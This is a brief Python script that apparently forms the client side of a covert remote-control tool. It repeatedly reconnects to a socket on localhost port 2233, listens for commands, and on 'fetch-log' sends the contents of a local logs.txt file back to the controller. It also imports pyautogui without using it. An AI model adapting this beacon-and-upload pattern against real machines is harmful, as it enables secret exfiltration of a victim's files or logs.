import socket
from time import sleep
import pyautogui

s = socket.socket()
host = "127.0.0.1"
port = 2233


def connect(host, port):
    global s
    s = socket.socket()
    try:
        conn = s.connect((host, port))
    except:
        sleep(5)
        connect(host, port)

connect(host, port)

while True:
    msgRecv = s.recv(1024)
    print(msgRecv)
    
    if(msgRecv == b"exit"):
        s.close()
        sleep(10)
        connect(host, port)
    
    if(msgRecv == b"fetch-log"):
        fileLogs = open("logs.txt", "r")
        s.sendfile(fileLogs)
        print("FileLog sent...")
    
s.close()